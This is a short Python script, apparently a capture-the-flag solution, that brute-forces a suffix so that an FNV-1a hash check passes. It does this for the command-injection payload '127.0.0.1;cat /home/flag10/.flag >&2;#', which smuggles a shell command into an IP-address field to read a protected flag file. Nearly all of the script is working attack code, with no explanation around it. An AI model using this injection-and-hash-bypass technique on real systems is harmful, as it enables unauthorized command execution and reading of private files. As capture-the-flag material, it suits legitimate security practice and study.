# -- hash_finder.py --
import string
import itertools

def h(s):
    x = 0x811c9dc5
    for c in s:
        x = ((x ^ ord(c)) * 0x01000193) & 0xffffffff
    return x

base = "127.0.0.1;cat /home/flag10/.flag >&2;#"

for n in range(5):
    for tup in itertools.product(string.ascii_letters + string.digits, repeat=n):
        suffix = ''.join(tup)
        value = h(base + suffix)
        hexhash = f"{value:08x}"

        if hexhash.startswith("a4"):
            print("suffix =", repr(suffix))
            print("hash   =", hexhash)
            exit(0)